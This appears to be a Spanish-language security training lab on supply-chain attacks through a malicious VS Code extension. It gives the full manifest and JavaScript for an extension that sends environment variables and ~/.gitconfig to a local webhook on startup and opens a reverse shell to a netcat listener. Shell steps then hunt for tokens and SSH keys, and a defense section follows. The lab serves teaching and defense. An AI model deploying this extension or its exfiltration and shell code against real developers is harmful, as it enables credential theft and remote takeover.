# 03 - Extension maliciosa de VS Code

**Clase 2 · 30 min · M3 Demo 02**
**Fase:** acceso inicial en la maquina del desarrollador (pre-commit)
**MITRE ATT&CK:** T1195.002 (Compromise Software Supply Chain), T1546 (Event Triggered Execution)
**Riesgo OWASP CI/CD:** CICD-SEC-3 (abuso de dependencias), CICD-SEC-8 (servicios de terceros)

## Escenario

El equipo de desarrollo instala extensiones sin mirar el codigo. Una extension
"util" que se llama `devops-helper` pide permisos normales y, al abrir VS Code,
lee el entorno del desarrollador y abre una shell. No hace falta comprometer
Gitea ni Jenkins: el puesto de trabajo es el eslabon mas blando de la cadena.

> La extension se ejecuta con **tus permisos**. Usa un perfil desechable
> (`code --profile lab`), una VM o un contenedor. No la instales desde el
> marketplace.

## Objetivo de aprendizaje

- Ver que una extension es codigo Node con acceso total al usuario.
- Entender `activationEvents`: cuando se ejecuta sin que el usuario haga nada.
- Comprobar la exfiltracion en tu propio webhook (hookcat).

## Antes de empezar

- VS Code o VSCodium instalado (en el host).
- Una terminal para el listener y otra para el editor.

```bash
mkdir -p ~/lab-ext && cd ~/lab-ext
```

## Paso 1 - Crear el manifiesto

`package.json`:

```json
{
  "name": "devops-helper",
  "displayName": "DevOps Helper",
  "publisher": "lab",
  "version": "1.0.0",
  "engines": { "vscode": "^1.80.0" },
  "main": "./extension.js",
  "activationEvents": ["onStartupFinished", "onCommand:lab.1337"],
  "contributes": {
    "commands": [{ "command": "lab.1337", "title": "lab: 1337" }]
  }
}
```

**Lectura de atacante:**

- `main` apunta al codigo que se ejecuta.
- `onStartupFinished` activa la extension al abrir la ventana, sin clics.
- `contributes.commands` da una excusa visible: "lab: 1337".

## Paso 2 - Crear el codigo

`extension.js`:

```js
const vscode = require('vscode');
const net = require('net');
const cp = require('child_process');
const os = require('os');
const fs = require('fs');

function exfil() {
  const body = JSON.stringify({
    user: os.userInfo().username,
    host: os.hostname(),
    env: process.env,
    gitconfig: (() => { try { return fs.readFileSync(os.homedir() + '/.gitconfig', 'utf8'); } catch (e) { return ''; } })()
  });
  const req = require('http').request(
    'http://localhost:8888/ide/leak',
    { method: 'POST', headers: { 'Content-Type': 'application/json' } }
  );
  req.end(body);
}

function shell() {
  const s = net.connect(4444, '127.0.0.1', () => {
    const p = cp.spawn('/bin/sh', []);
    s.pipe(p.stdin); p.stdout.pipe(s); p.stderr.pipe(s);
    p.on('exit', () => s.end());
  });
  s.on('error', () => {});
}

function activate(ctx) {
  exfil();
  ctx.subscriptions.push(vscode.commands.registerCommand('lab.1337', shell));
}
function deactivate() {}
module.exports = { activate, deactivate };
```

**Que hace:** al activarse manda usuario, host, variables de entorno y
`~/.gitconfig` a `localhost:8888`. El comando `lab.1337` abre una shell unida
por socket a `127.0.0.1:4444`.

## Paso 3 - Preparar la escucha y el webhook

En una terminal:

```bash
nc -lvnp 4444
```

En otra, limpia el receptor:

```bash
curl -s http://localhost:8888/__clear
```

## Paso 4 - Ejecutar la extension

1. Abre la carpeta `~/lab-ext` en VS Code con un perfil nuevo:

```bash
code --profile lab ~/lab-ext
```

2. Presiona **F5** (*Run > Start Debugging*). Se abre una ventana nueva de VS Code.

3. Mira http://localhost:8888: la exfiltracion ocurre **sola** al activarse.

**Que esperar:** una peticion `POST /ide/leak` con un JSON que incluye tu
usuario, hostname y variables de entorno.

4. En la ventana nueva: `Ctrl+Shift+P` -> `lab: 1337` -> vuelve a la terminal.

**Que esperar:** en el listener aparece una shell. Dentro:

```bash
id
cat ~/.devops-lab-flag
```

## Paso 5 - Medir el impacto real

Dentro de la shell:

```bash
env | grep -Ei 'token|key|secret|aws|gitea|jenkins' | sed 's/=.*/=<oculto>/'
ls ~/.ssh 2>/dev/null
```

**Que demuestra:** cualquier secreto en el entorno del desarrollador (tokens de
Git, claves cloud, kubeconfig) queda a un `cat` de distancia. La extension no
necesita exploits: el usuario le dio permisos al instalarla.

## Evidencia para el informe

- `POST /ide/leak` en hookcat con hora y hostname.
- Captura de la shell (`id`, `hostname`, `cat` del flag).
- Version de VS Code y extension instalada.

## Checkpoint

1. Que diferencia hay entre una extension con `onStartupFinished` y una que
   requiere un comando?
2. Por que el flag esta en el home del host y no en un contenedor?
3. Que control impediria la exfiltracion aunque la extension fuera maliciosa?

## Defensa

- Allowlist de extensiones y marketplace privado; revisar `publisher`.
- Revisar `activationEvents`, `main` y dependencias antes de instalar.
- Secretos en el gestor del sistema o en un vault, no en `.env` ni `.gitconfig`.
- EDR que detecte `node -> /bin/sh` con socket; egress filtrado.
- Perfiles de VS Code aislados por proyecto y rotacion de credenciales.

## Si algo falla

| Sintoma | Causa / arreglo |
|---|---|
| F5 no abre ventana | abre la carpeta correcta (`~/lab-ext`) y revisa `package.json` |
| No llega nada a hookcat | usa `http://localhost:8888` desde el host (no `hookcat`) |
| La shell no conecta | el listener debe estar en `127.0.0.1:4444` antes de ejecutar el comando |
| `code` no existe | usa VSCodium o instala VS Code; el codigo es el mismo |
